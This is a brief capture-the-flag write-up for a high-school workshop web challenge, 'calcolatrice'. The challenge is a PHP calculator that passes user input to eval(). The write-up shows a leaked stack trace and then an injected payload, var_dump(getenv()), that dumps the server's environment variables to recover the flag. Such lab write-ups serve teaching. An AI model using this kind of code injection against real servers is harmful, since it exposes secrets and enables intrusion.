# calcolatrice
| | |
|---|---|
| **Section** | HighSchools CTF Workshop - 2023 Perugia |
| **Category** | web |
| **Solves** | 253 |

## Overview
The site exposes a calculator that evaluates an arbitrary user-supplied expression server-side. Triggering a division by zero (e.g. `1/0`) leaks a PHP stack trace:
```
Fatal error: Uncaught DivisionByZeroError: Division by zero in /usr/local/apache2/htdocs/public/index.php(6) : eval()'d code:1
Stack trace: #0 /usr/local/apache2/htdocs/public/index.php(6): eval() #1 {main} thrown in ... eval()'d code on line 1
```
confirming the backend passes the `expression` field directly to PHP's `eval()`.

## Solve
Since `eval()` executes arbitrary PHP code, submitting:
```
var_dump(getenv());
```
as the expression dumps the process environment variables, including a `FLAG` entry with the challenge flag.